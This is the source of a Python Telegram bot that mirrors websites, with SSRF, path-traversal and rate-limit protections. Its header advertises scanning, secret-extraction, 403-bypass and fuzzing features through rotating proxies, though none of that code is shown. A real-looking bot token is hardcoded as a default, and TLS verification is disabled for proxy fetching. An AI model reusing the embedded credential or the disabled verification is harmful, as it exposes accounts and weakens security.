#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════╗
# ║       Website Downloader Bot  v17.0  (Secure+Full Edition)  ║
# ║  ✅ SSRF Protection       ✅ Path Traversal Fix             ║
# ║  ✅ DB Race Condition Fix  ✅ Rate Limiting                  ║
# ║  ✅ Subprocess Injection   ✅ Log Sanitization              ║
# ║  ✅ Admin Auth Hardened    ✅ File Size Limit               ║
# ║  ✅ Resume Download        ✅ 50MB Split                    ║
# ║  ✅ JS/React/Vue Support   ✅ /vuln CF-aware Scanner        ║
# ║  ✅ Proxy Rotation         ✅ Health Check + Auto-Failover  ║
# ║  ✅ Timeout/Retry Fix      ✅ Termux Network Stable         ║
# ║  ✅ /tech Fingerprint       ✅ /extract Secret Scanner      ║
# ║  ✅ /monitor Alerts         ✅ /bypass403 Bypass Tester     ║
# ║  ✅ /subdomains Enum        ✅ /fuzz Path+Param Fuzzer      ║
# ╚══════════════════════════════════════════════════════════════╝
#
# Termux Setup:
#   pkg update && pkg upgrade -y
#   pkg install python nodejs -y
#   pip install python-telegram-bot requests beautifulsoup4 python-dotenv
#   npm install puppeteer
#   cp .env.example .env   # ပြီးရင် .env ထဲ token ထည့်ပါ
#   python web_downloader_bot.py
# ══════════════════════════════════════════════════════════════

import os, re, json, time, shutil, zipfile, hashlib, hmac, string, struct, tempfile
import logging, asyncio, subprocess, socket, random, difflib, functools
import concurrent.futures
from datetime import datetime, date
from ipaddress import ip_address, ip_network, AddressValueError
from urllib.parse import urljoin, urlparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from telegram.error import BadRequest, RetryAfter, TimedOut, NetworkError
from telegram.request import HTTPXRequest

# ── dotenv (optional but recommended) ────────────
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # pip install python-dotenv မလုပ်ရသေးရင် skip

# ══════════════════════════════════════════════════
# ⚙️  CONFIG  —  .env မှ ယူသည် (fallback: hardcode)
# ══════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "8518710995:AAGhqSXxhkdg_O5ItrBcQZ6LEw7Esxx_TQg")
ADMIN_IDS = list(map(int, os.getenv("ADMIN_IDS", "1964475260").split(",")))
SECRET_KEY = os.getenv("SECRET_KEY", hashlib.sha256(os.urandom(32)).hexdigest())

DOWNLOAD_DIR    = os.path.expanduser("~/downloads/web_sources")
DB_FILE         = os.path.expanduser("~/downloads/bot_db.json")
RESUME_DIR      = os.path.expanduser("~/downloads/resume_states")
APP_ANALYZE_DIR = os.path.expanduser("~/downloads/app_analysis")
APP_MAX_MB      = int(os.getenv("APP_MAX_MB", "150"))   # max upload size
JS_RENDER       = os.path.join(os.path.dirname(os.path.abspath(__file__)), "js_render.js")

DAILY_LIMIT      = int(os.getenv("DAILY_LIMIT", "5"))
MAX_WORKERS      = 5
MAX_PAGES        = 50
MAX_ASSETS       = 500
TIMEOUT          = 20
SPLIT_MB         = 45
MAX_ASSET_MB     = 100          # single asset max size
RATE_LIMIT_SEC   = 15           # per-user cooldown between requests

# ── Proxy config ────────────────────────────────────
PROXY_FILE        = os.getenv("PROXY_FILE",
                       os.path.join(os.path.dirname(os.path.abspath(__file__)), "proxies.txt"))
PROXY_FILE_URL    = os.getenv("PROXY_FILE_URL", "")
PROXY_ENABLED     = os.getenv("PROXY_ENABLED", "true").lower() not in ("0", "false", "no")
PROXY_TIMEOUT     = int(os.getenv("PROXY_TIMEOUT", "8"))
PROXY_REFRESH_MIN = int(os.getenv("PROXY_REFRESH_MIN", "30"))
# ══════════════════════════════════════════════════

logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ── Ensure all directories exist BEFORE file handler ─
for d in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
    os.makedirs(d, exist_ok=True)

# ── File log (session ပိတ်ရင်လည်း error မပျောက်ဖို့) ───
_file_handler = logging.FileHandler(
    os.path.expanduser("~/downloads/bot.log"), encoding="utf-8"
)
_file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(_file_handler)

download_semaphore: asyncio.Semaphore  # initialized in main()

# ── Queue system ──────────────────────────────────
QUEUE_MAX     = 20                    # max queue depth
_dl_queue: asyncio.Queue | None = None  # initialized in main()
_queue_pos: dict = {}                 # {uid: position}

# ── Auto-delete config ────────────────────────────
FILE_EXPIRY_HOURS = int(os.getenv("FILE_EXPIRY_HOURS", "24"))   # 24h ကြာရင် auto-delete

# ── Global locks / state ──────────────────────────
db_lock: asyncio.Lock                      # initialized in main()
user_last_req    = {}                      # rate limit tracker {uid: timestamp}
_cancel_flags: dict = {}                   # {uid: asyncio.Event} — /stop signal

HEADERS = {
    'User-Agent': (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML, like Gecko) '
        'Chrome/120.0.0.0 Safari/537.36'
    )
}

# ── Puppeteer check ───────────────────────────────
def _check_puppeteer() -> bool:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    return (
        os.path.exists(JS_RENDER) and
        os.path.exists(os.path.join(script_dir, "node_modules", "puppeteer")) and
        shutil.which("node") is not None
    )

PUPPETEER_OK = _check_puppeteer()


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 1 — SSRF Protection
# ══════════════════════════════════════════════════

_BLOCKED_NETS = [
    ip_network("127.0.0.0/8"),
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    ip_network("169.254.0.0/16"),   # AWS/cloud metadata
    ip_network("100.64.0.0/10"),    # Carrier-grade NAT
    ip_network("0.0.0.0/8"),
    ip_network("::1/128"),
    ip_network("fc00::/7"),
    ip_network("fe80::/10"),
]

def _is_safe_ip(ip_str: str) -> bool:
    try:
        ip_obj = ip_address(ip_str)
        for net in _BLOCKED_NETS:
            if ip_obj in net:
                return False
        return True
    except (AddressValueError, ValueError):
        return False

def is_safe_url(url: str) -> tuple:
    """
    URL ကို validate လုပ်တယ်
    Returns: (is_safe: bool, reason: str)
    """
    if not url or len(url) > 2048:
        return False, "URL too long or empty"

    try:
        parsed = urlparse(url)
    except Exception:
        return False, "Invalid URL format"

    # Scheme စစ်
    if parsed.scheme not in ('http', 'https'):
        return False, f"Scheme '{parsed.scheme}' not allowed (http/https only)"

    # Hostname စစ်
    hostname = parsed.hostname
    if not hostname:
        return False, "No hostname"

    # Null byte / encoded traversal
    if '\x00' in url or '%00' in url:
        return False, "Null byte detected"

    # URL format — allowed chars only
    if not re.match(r'^https?://[^\s<>"{}|\\^`\[\]]+$', url):
        return False, "Invalid characters in URL"

    # DNS resolve + IP check
    try:
        ip_str = socket.gethostbyname(hostname)
        if not _is_safe_ip(ip_str):
            return False, f"IP {ip_str} is in a blocked network range"
    except socket.gaierror:
        return False, f"Cannot resolve hostname: {hostname}"

    return True, "OK"


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 2 — Path Traversal Protection
# ══════════════════════════════════════════════════

def safe_local_path(domain_dir: str, url: str) -> str:
    """
    URL → local path  (path traversal safe)
    """
    parsed = urlparse(url)
    path = parsed.path.lstrip('/')

    if not path or path.endswith('/'):
        path = path + 'index.html'

    _, ext = os.path.splitext(path)
    if not ext:
        path += '.html'

    if parsed.query:
        sq = re.sub(r'[^\w]', '_', parsed.query)[:20]
        base, ext = os.path.splitext(path)
        path = f"{base}_{sq}{ext}"

    # ── Path traversal check ──────────────────────
    local = os.path.normpath(os.path.join(domain_dir, path))
    real_domain = os.path.realpath(domain_dir)
    real_local  = os.path.realpath(os.path.join(domain_dir, path))

    if not real_local.startswith(real_domain + os.sep) and real_local != real_domain:
        # Traversal attempt → fallback to safe hash-based name
        logger.warning(f"Path traversal attempt blocked: {url}")
        safe_name = hashlib.md5(url.encode()).hexdigest()[:16]
        ext_guess = os.path.splitext(parsed.path)[1][:8] or '.bin'
        local = os.path.join(domain_dir, "assets", safe_name + ext_guess)

    os.makedirs(os.path.dirname(local), exist_ok=True)
    return local


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 3 — Rate Limiting
# ══════════════════════════════════════════════════

def check_rate_limit(user_id: int) -> tuple:
    """
    Returns: (allowed: bool, wait_seconds: int)
    """
    now  = time.time()
    last = user_last_req.get(user_id, 0)
    diff = now - last
    if diff < RATE_LIMIT_SEC:
        wait = int(RATE_LIMIT_SEC - diff) + 1
        return False, wait
    user_last_req[user_id] = now
    return True, 0


# ══════════════════════════════════════════════════
# 🌐  PROXY MANAGER  — Rotation + Health + Failover
# ══════════════════════════════════════════════════

import threading as _threading

class ProxyManager:
    """
    Full proxy manager:
      - Load from local proxies.txt OR GitHub raw URL
      - Health-check all proxies concurrently on load
      - Round-robin rotation (thread-safe)
      - Mark failed proxies with cooldown
      - Auto-refresh list every PROXY_REFRESH_MIN minutes
    
    Supported formats in proxies.txt:
      1.2.3.4:8080
      http://1.2.3.4:8080
      https://1.2.3.4:3128
      socks5://1.2.3.4:1080
      http://user:pass@1.2.3.4:8080
    """

    COOLDOWN_SEC = 300   # 5 min cooldown for failed proxy

    def __init__(self):
        self._lock        = _threading.Lock()
        self._all: list   = []      # all loaded proxy URLs
        self._live: list  = []      # currently healthy proxies
        self._idx: int    = 0       # round-robin pointer
        self._failed: dict = {}     # {proxy_url: failed_at_timestamp}
        self._last_load   = 0.0
        self._loaded      = False
        if PROXY_ENABLED:
            self._load_and_check()

    # ── Loading ───────────────────────────────────
    def _fetch_raw(self) -> str:
        """Fetch proxy list text from URL or local file."""
        if PROXY_FILE_URL:
            try:
                r = requests.get(PROXY_FILE_URL, timeout=15, verify=False)
                r.raise_for_status()
                logger.info("ProxyManager: loaded %d bytes from URL", len(r.text))
                return r.text
            except Exception as e:
                logger.warning("ProxyManager: URL fetch failed (%s), trying local file", e)
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r', encoding='utf-8') as f:
                return f.read()
        return ""

    def _parse(self, raw: str) -> list:
        """Parse proxy list text → list of normalized proxy URLs."""
        proxies = []
        for line in raw.splitlines():
            line = line.split('#')[0].strip()   # strip comments
            if not line:
                continue
            # Already has scheme?
            if '://' in line:
                proxies.append(line)
            else:
                # plain ip:port or user:pass@ip:port
                proxies.append('http://' + line)
        return list(dict.fromkeys(proxies))   # deduplicate, preserve order

    def _health_check_one(self, proxy_url: str) -> bool:
        """Test one proxy — returns True if alive."""
        test_url = "http://httpbin.org/ip"
        try:
            r = requests.get(
                test_url,
                proxies={"http": proxy_url, "https": proxy_url},
                timeout=PROXY_TIMEOUT, verify=False
            )
            return r.status_code == 200
        except Exception:
            return False

    def _load_and_check(self):
        """Load list, health-check concurrently, populate _live."""
        raw = self._fetch_raw()
        parsed = self._parse(raw)
        if not parsed:
            logger.warning("ProxyManager: no proxies found in source")
            with self._lock:
                self._all  = []
                self._live = []
                self._loaded = True
                self._last_load = time.time()
            return

        logger.info("ProxyManager: checking %d proxies...", len(parsed))
        live = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            fmap = {ex.submit(self._health_check_one, p): p for p in parsed}
            for fut in concurrent.futures.as_completed(fmap, timeout=60):
                proxy = fmap[fut]
                try:
                    ok = fut.result(timeout=PROXY_TIMEOUT + 2)
                except Exception:
                    ok = False
                if ok:
                    live.append(proxy)

        with self._lock:
            self._all    = parsed
            self._live   = live
            self._idx    = 0
            self._failed = {}
            self._loaded = True
            self._last_load = time.time()

        logger.info("ProxyManager: %d/%d proxies alive", len(live), len(parsed))

    def reload(self):
        """Force reload + recheck (call from admin command)."""
        self._load_and_check()

    def _maybe_refresh(self):
        """Auto-refresh if list is stale."""
        if time.time() - self._last_load > PROXY_REFRESH_MIN * 60:
            _threading.Thread(target=self._load_and_check, daemon=True).start()

    # ── Getting a proxy ───────────────────────────
    def get_proxy(self) -> dict | None:
        """
        Return a requests-compatible proxy dict or None.
        {"http": "http://ip:port", "https": "http://ip:port"}
        Rotates round-robin, skips proxies in cooldown.
        """
        if not PROXY_ENABLED:
            return None
        self._maybe_refresh()
        with self._lock:
            if not self._live:
                return None
            now = time.time()
            # Build candidate list (skip cooldown)
            candidates = [
                p for p in self._live
                if now - self._failed.get(p, 0) > self.COOLDOWN_SEC
            ]
            if not candidates:
                # All in cooldown — clear and retry all
                self._failed.clear()
                candidates = list(self._live)
            if not candidates:
                return None
            proxy_url = candidates[self._idx % len(candidates)]
            self._idx += 1
            return {"http": proxy_url, "https": proxy_url}

    def mark_failed(self, proxy_dict: dict | None):
        """Call when a request through this proxy failed."""
        if not proxy_dict:
            return
        proxy_url = proxy_dict.get("http") or proxy_dict.get("https")
        if proxy_url:
            with self._lock:
                self._failed[proxy_url] = time.time()
                logger.debug("ProxyManager: marked failed → %s", proxy_url)

    # ── Info ──────────────────────────────────────
    def stats(self) -> dict:
        with self._lock:
            now = time.time()
            in_cooldown = sum(
                1 for p, t in self._failed.items()
                if now - t < self.COOLDOWN_SEC
            )
            return {
                "total":       len(self._all),
                "live":        len(self._live),
                "in_cooldown": in_cooldown,
                "available":   max(0, len(self._live) - in_cooldown),
                "last_load":   datetime.fromtimestamp(self._last_load).strftime("%H:%M:%S")
                               if self._last_load else "never",
                "enabled":     PROXY_ENABLED,
                "source":      PROXY_FILE_URL or PROXY_FILE,
            }

    def add_proxy(self, proxy_url: str) -> bool:
        """Add a single proxy (no health check, just append)."""
        if '://' not in proxy_url:
            proxy_url = 'http://' + proxy_url
        with self._lock:
            if proxy_url not in self._all:
                self._all.append(proxy_url)
            if proxy_url not in self._live:
                self._live.append(proxy_url)
        # health check in background
        def _check():
            ok = self._health_check_one(proxy_url)
            if not ok:
                with self._lock:
                    if proxy_url in self._live:
                        self._live.remove(proxy_url)
                logger.info("ProxyManager: added proxy DEAD → %s", proxy_url)
            else:
                logger.info("ProxyManager: added proxy alive → %s", proxy_url)
        _threading.Thread(target=_check, daemon=True).start()
        return True

    def list_proxies(self) -> list:
        with self._lock:
            now = time.time()
            result = []
            for p in self._all:
                in_cd = now - self._failed.get(p, 0) < self.COOLDOWN_SEC
                alive = p in self._live
                result.append({"proxy": p, "alive": alive, "cooldown": in_cd})
            return result


# ── Global singleton ──────────────────────────────
proxy_manager = ProxyManager()


def _req_with_proxy(method: str, url: str, **kwargs):
    """
    Drop-in for requests.get/post that auto-rotates proxy.
    Retries once with next proxy on failure.
    """
    for attempt in range(2):
        px = proxy_manager.get_proxy()
        try:
            resp = requests.request(method, url, proxies=px, **kwargs)
            return resp
        except Exception as e:
            proxy_manager.mark_failed(px)
            if attempt == 1:
                raise
    raise RuntimeError("All proxies failed")


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 4 — Log Sanitization
# ══════════════════════════════════════════════════

async def safe_edit(msg, text: str, **kwargs):
    """
    Edit a Telegram message safely.
    Silently ignores BadRequest 'Message is not modified' errors.
    """
    try:
        await msg.edit_text(text, **kwargs)
    except BadRequest as e:
        if "message is not modified" in str(e).lower():
            pass  # Content unchanged — not an error
        else:
            raise  # Re-raise real BadRequest errors


def sanitize_log_url(url: str) -> str:
    """Query string တွေ (passwords/tokens) ကို log မှာ မပြဘဲ REDACTED လုပ်"""
    try:
        parsed = urlparse(url)
        # query ရှိရင် redact
        sanitized = parsed._replace(
            query="[REDACTED]" if parsed.query else "",
            fragment=""
        ).geturl()
        return sanitized
    except Exception:
        return "[INVALID_URL]"

def log_info(msg: str, *args):
    logger.info(msg, *args)

def log_warn(url: str, extra: str = ""):
    safe_url = sanitize_log_url(url)
    logger.warning(f"{safe_url} {extra}")


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 5 — Admin Auth Hardened
# ══════════════════════════════════════════════════

async def verify_admin(update: Update) -> bool:
    """
    Admin verification — multi-layer check
    """
    uid = update.effective_user.id

    # Layer 1: ID check
    if uid not in ADMIN_IDS:
        return False

    # Layer 2: Private chat only (admin commands in group = dangerous)
    if update.effective_chat.type != "private":
        await update.effective_message.reply_text(
            "⚠️ Admin commands ကို private chat မှာသာ သုံးနိုင်ပါတယ်"
        )
        return False

    # Layer 3: Not a forwarded message (anti-spoofing)
    # forward_origin = newer PTB | forward_date = older PTB version
    if update.message:
        is_forwarded = (
            getattr(update.message, 'forward_origin', None) or
            getattr(update.message, 'forward_date', None)
        )
        if is_forwarded:
            return False

    return True

def admin_only(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await verify_admin(update):
            # ── Admin command — user မြင်ရင်မကောင်းဘူး — silent ignore ──
            return
        return await func(update, context)
    return wrapper


# ══════════════════════════════════════════════════
# 🚨  ADMIN ERROR NOTIFY — Unhandled error → Admin DM
# ══════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler — Admin ဆီ Telegram message ပို့မည်"""
    import traceback
    tb = "".join(traceback.format_exception(
        type(context.error), context.error, context.error.__traceback__
    ))
    short_tb = tb[-1500:] if len(tb) > 1500 else tb   # Telegram 4096 char limit

    # User info (if available)
    user_info = ""
    if update and hasattr(update, "effective_user") and update.effective_user:
        u = update.effective_user
        user_info = f"\n👤 User: `{u.id}` ({u.first_name})"

    msg = (
        "🚨 *Bot Error Alert*\n"
        f"━━━━━━━━━━━━━━━━━━━━{user_info}\n\n"
        f"```\n{short_tb}\n```"
    )

    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=msg,
                parse_mode='Markdown'
            )
        except Exception:
            logger.warning("Admin error notify failed for %d", admin_id)

    logger.error("Unhandled exception: %s", context.error, exc_info=context.error)


# ══════════════════════════════════════════════════
# 🗑️  AUTO-DELETE — Expired download files cleaner
# ══════════════════════════════════════════════════

async def auto_delete_loop():
    """Background task — ၂၄ နာရီ (FILE_EXPIRY_HOURS) ကြာတဲ့ ZIP files auto-delete"""
    while True:
        try:
            now     = time.time()
            deleted = 0
            freed   = 0.0
            for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
                for root, dirs, files in os.walk(folder):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            age_hours = (now - os.path.getmtime(fpath)) / 3600
                            if age_hours >= FILE_EXPIRY_HOURS:
                                size = os.path.getsize(fpath) / 1024 / 1024
                                os.remove(fpath)
                                deleted += 1
                                freed   += size
                        except Exception:
                            pass
            if deleted:
                logger.info(
                    "Auto-delete: %d files | %.1f MB freed (>%dh old)",
                    deleted, freed, FILE_EXPIRY_HOURS
                )
        except Exception as e:
            logger.warning("Auto-delete loop error: %s", e)
        # ၁ နာရီတစ်ကြိမ် check
        await asyncio.sleep(3600)


# ══════════════════════════════════════════════════
# 📋  QUEUE SYSTEM — Download request queue
# ══════════════════════════════════════════════════

async def queue_worker():
    """Background worker — queue ထဲက download request တွေ တစ်ခုစီ run"""
    global _dl_queue
    while True:
        try:
            task = await _dl_queue.get()
            update, context, url, full_site, use_js, resume_mode, uid = task
            # Remove from position tracker
            _queue_pos.pop(uid, None)
            try:
                await _run_download(update, context, url, full_site, use_js, resume_mode)
            except Exception as e:
                logger.error("Queue worker download error: %s", e)
            finally:
                _dl_queue.task_done()
        except Exception as e:
            logger.error("Queue worker error: %s", e)
            await asyncio.sleep(1)


async def enqueue_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool, resume_mode: bool = False
):
    """Download request ကို queue ထဲ ထည့်သည်"""
    global _dl_queue
    uid = update.effective_user.id

    if _dl_queue.qsize() >= QUEUE_MAX:
        await update.effective_message.reply_text(
            f"⚠️ Queue ပြည့်နေပါတယ် (`{QUEUE_MAX}` max)\n"
            "ခဏနေပြီးမှ ထပ်ကြိုးစားပါ",
            parse_mode='Markdown'
        )
        return

    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid))
    pos = _dl_queue.qsize()
    _queue_pos[uid] = pos

    if pos > 1:
        await update.effective_message.reply_text(
            f"📋 *Queue ထဲ ထည့်ပြီးပါပြီ*\n"
            f"📍 Position: `{pos}`\n"
            f"⏳ Download ရောက်လာသည့်အခါ အလိုအလျောက် စမည်",
            parse_mode='Markdown'
        )


# ══════════════════════════════════════════════════
# 📦  DATABASE  (with async lock for race condition)
# ══════════════════════════════════════════════════

def _load_db_sync() -> dict:
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return {
        "users": {},
        "settings": {
            "global_daily_limit": DAILY_LIMIT,
            "max_pages": MAX_PAGES,
            "max_assets": MAX_ASSETS,
            "bot_enabled": True
        }
    }

def _save_db_sync(db: dict):
    # Atomic write — temp file → rename
    tmp = DB_FILE + ".tmp"
    with open(tmp, 'w', encoding='utf-8') as f:
        json.dump(db, f, ensure_ascii=False, indent=2)
    os.replace(tmp, DB_FILE)  # atomic on most OS

async def db_read() -> dict:
    """Thread-safe DB read (non-blocking)"""
    loop = asyncio.get_event_loop()
    async with db_lock:
        return await loop.run_in_executor(None, _load_db_sync)

async def db_write(db: dict):
    """Thread-safe DB write (non-blocking)"""
    loop = asyncio.get_event_loop()
    async with db_lock:
        await loop.run_in_executor(None, _save_db_sync, db)

async def db_update(func):
    """
    Thread-safe atomic DB update (non-blocking)
    Usage: await db_update(lambda db: db["users"][uid].update(...))
    """
    loop = asyncio.get_event_loop()
    async with db_lock:
        db = await loop.run_in_executor(None, _load_db_sync)
        func(db)
        await loop.run_in_executor(None, _save_db_sync, db)
        return db

def get_user(db: dict, user_id: int, name: str = "") -> dict:
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "name": name, "banned": False,
            "daily_limit": None, "count_today": 0,
            "last_date": "", "total_downloads": 0,
            "downloads": []
        }
    if name:
        db["users"][uid]["name"] = name
    return db["users"][uid]

def reset_daily(user: dict):
    today = str(date.today())
    if user["last_date"] != today:
        user["count_today"] = 0
        user["last_date"] = today

def get_limit(db: dict, user: dict) -> int:
    return user["daily_limit"] if user["daily_limit"] is not None \
           else db["settings"]["global_daily_limit"]

def can_download(db: dict, user: dict) -> bool:
    reset_daily(user)
    lim = get_limit(db, user)
    return lim == 0 or user["count_today"] < lim

def log_download(user: dict, url: str, size_mb: float, status: str):
    user["downloads"].append({
        "url": sanitize_log_url(url),       # ← sanitized before storing
        "time": datetime.now().strftime("%Y-%m-%d %H:%M"),
        "size_mb": round(size_mb, 2),
        "status": status
    })
    if len(user["downloads"]) > 100:
        user["downloads"] = user["downloads"][-100:]
    user["count_today"] += 1
    user["total_downloads"] += 1


# ══════════════════════════════════════════════════
# 💾  RESUME STATE  (with HMAC integrity)
# ══════════════════════════════════════════════════

def _state_sig(state: dict) -> str:
    data = json.dumps({k: v for k, v in state.items() if k != "_sig"}, sort_keys=True)
    return hmac.HMAC(SECRET_KEY.encode(), data.encode(), hashlib.sha256).hexdigest()

def _resume_path(url: str) -> str:
    return os.path.join(RESUME_DIR, hashlib.md5(url.encode()).hexdigest()[:12] + ".json")

def load_resume(url: str) -> dict:
    path = _resume_path(url)
    empty = {"visited": [], "downloaded": [], "assets": [], "stats": {}}
    if not os.path.exists(path):
        return empty
    try:
        with open(path) as f:
            state = json.load(f)
        sig = state.pop("_sig", "")
        if not hmac.compare_digest(_state_sig(state), sig):
            logger.warning("Resume state integrity check FAILED — ignoring")
            os.remove(path)
            return empty
        return state
    except Exception:
        return empty

def save_resume(url: str, state: dict):
    to_save = dict(state)
    to_save["_sig"] = _state_sig(state)
    tmp = _resume_path(url) + ".tmp"
    with open(tmp, 'w') as f:
        json.dump(to_save, f)
    os.replace(tmp, _resume_path(url))

def clear_resume(url: str):
    p = _resume_path(url)
    if os.path.exists(p):
        os.remove(p)


# ══════════════════════════════════════════════════
# 📊  PROGRESS BAR (Upgraded for Telegram)
# ══════════════════════════════════════════════════

def pbar(done: int, total: int, width: int = 18) -> str:
    """Telegram တွင် ပိုမိုသပ်ရပ်ချောမွေ့စွာ ပြသပေးမည့် Progress Bar"""
    if total <= 0:
        return "│" + " " * width + "│   0%"
    
    pct = min(max(done / total, 0.0), 1.0)
    fill_exact = pct * width
    full_blocks = int(fill_exact)
    remainder = fill_exact - full_blocks

    partials = [" ", "▏", "▎", "▍", "▌", "▋", "▊", "▉"]
    
    bar = "█" * full_blocks
    if full_blocks < width:
        bar += partials[int(remainder * len(partials))]
        bar += " " * (width - full_blocks - 1)

    pct_str = f"{int(pct * 100):>3}%"
    return f"│{bar}│ {pct_str}"

# ══════════════════════════════════════════════════
# 🌐  JS RENDERER  (Puppeteer via subprocess)
# ══════════════════════════════════════════════════

def fetch_with_puppeteer(url: str) -> str | None:
    """
    SECURITY: URL ကို sanitize + validate ပြီးမှသာ subprocess pass
    shell=False (default) ဖြစ်တဲ့အတွက် shell injection မဖြစ်နိုင်
    """
    if not PUPPETEER_OK:
        return None

    # ── Subprocess injection fix ──────────────────
    safe, reason = is_safe_url(url)
    if not safe:
        logger.warning(f"Puppeteer blocked unsafe URL: {reason}")
        return None

    # Strict URL chars whitelist (extra layer)
    if not re.match(r'^https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&\'()*+,;=%]+$', url):
        logger.warning("Puppeteer blocked URL with invalid characters")
        return None

    try:
        result = subprocess.run(
            ["node", JS_RENDER, url],  # list → no shell injection possible
            capture_output=True,
            timeout=45,
            text=True,
            shell=False                # explicit: False
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout
        logger.warning(f"Puppeteer stderr: {result.stderr[:100]}")
        return None
    except subprocess.TimeoutExpired:
        log_warn(url, "puppeteer timeout")
        return None
    except Exception as e:
        logger.warning(f"Puppeteer exception: {type(e).__name__}")
        return None

def fetch_page(url: str, use_js: bool = False) -> tuple:
    """Returns: (html | None, js_used: bool)"""
    if use_js:
        html = fetch_with_puppeteer(url)
        if html:
            return html, True
        log_info(f"JS fallback to requests: {sanitize_log_url(url)}")

    try:
        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        resp.raise_for_status()
        ct = resp.headers.get('Content-Type', '')
        if 'text/html' not in ct:
            return None, False
        return resp.text, False
    except Exception as e:
        log_warn(url, f"fetch error: {type(e).__name__}")
        return None, False


# ══════════════════════════════════════════════════
# 🔍  ASSET EXTRACTORS
# ══════════════════════════════════════════════════

def extract_assets(html: str, page_url: str) -> set:
    soup   = BeautifulSoup(html, 'html.parser')
    assets = set()

    # ── Standard links / scripts ──────────────────
    for tag in soup.find_all('link', href=True):
        assets.add(urljoin(page_url, tag['href']))
    for tag in soup.find_all('script', src=True):
        assets.add(urljoin(page_url, tag['src']))

    # ── Images (all lazy-load attrs) ──────────────
    LAZY_ATTRS = (
        'src','data-src','data-lazy','data-original','data-lazy-src',
        'data-srcset','data-original-src','data-hi-res-src',
        'data-full-src','data-image','data-img','data-bg',
        'data-background','data-poster','data-thumb',
    )
    for tag in soup.find_all('img'):
        for attr in LAZY_ATTRS:
            v = tag.get(attr, '')
            if v and not v.startswith('data:'):
                assets.add(urljoin(page_url, v))
        for part in tag.get('srcset', '').split(','):
            u = part.strip().split(' ')[0]
            if u: assets.add(urljoin(page_url, u))

    # ── Video / Audio / Media ─────────────────────
    for tag in soup.find_all(['video', 'audio', 'source', 'track']):
        for attr in ('src', 'data-src', 'poster'):
            v = tag.get(attr, '')
            if v: assets.add(urljoin(page_url, v))
    # <video> direct src
    for tag in soup.find_all('video', src=True):
        assets.add(urljoin(page_url, tag['src']))
    # iframe embeds (video players)
    for tag in soup.find_all('iframe', src=True):
        s = tag['src']
        if any(x in s for x in ('youtube','vimeo','player','embed','video')):
            assets.add(urljoin(page_url, s))

    # ── Downloadable files ────────────────────────
    FILE_EXTS = (
        '.pdf','.zip','.rar','.7z','.tar','.gz',
        '.doc','.docx','.xls','.xlsx','.ppt','.pptx',
        '.mp3','.mp4','.avi','.mkv','.mov','.webm',
        '.apk','.exe','.dmg','.iso',
    )
    for tag in soup.find_all('a', href=True):
        h = tag['href']
        full = urljoin(page_url, h)
        low  = full.lower().split('?')[0]
        if any(low.endswith(ext) for ext in FILE_EXTS):
            assets.add(full)

    # ── CSS inline / style tag ────────────────────
    for tag in soup.find_all(style=True):
        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', tag['style']):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
    for st in soup.find_all('style'):
        css = st.string or ''
        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
        for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
            assets.add(urljoin(page_url, u))

    # ── Meta tags (OG image etc) ──────────────────
    for tag in soup.find_all('meta'):
        prop = tag.get('property', '') + tag.get('name', '')
        if any(k in prop.lower() for k in ('image','thumbnail','banner','icon')):
            c = tag.get('content', '')
            if c.startswith('http'): assets.add(c)

    # ── Object / Embed ────────────────────────────
    for tag in soup.find_all(['object', 'embed']):
        v = tag.get('data', '') or tag.get('src', '')
        if v: assets.add(urljoin(page_url, v))

    # ── Regex sweep: static files in raw HTML/JS ──
    for m in re.finditer(
        r'["\']((https?://|/)[^"\'<>\s]+\.(js|css|woff2?|ttf|otf|eot'
        r'|png|jpg|jpeg|gif|svg|webp|avif|ico'
        r'|mp4|webm|mp3|ogg|wav'
        r'|pdf|zip|apk)(\?[^"\'<>\s]*)?)["\']',
        html, re.IGNORECASE
    ):
        u = m.group(1)
        if u.startswith('/'):
            u = urljoin(page_url, u)
        assets.add(u)

    # ── JSON-LD / structured data images ─────────
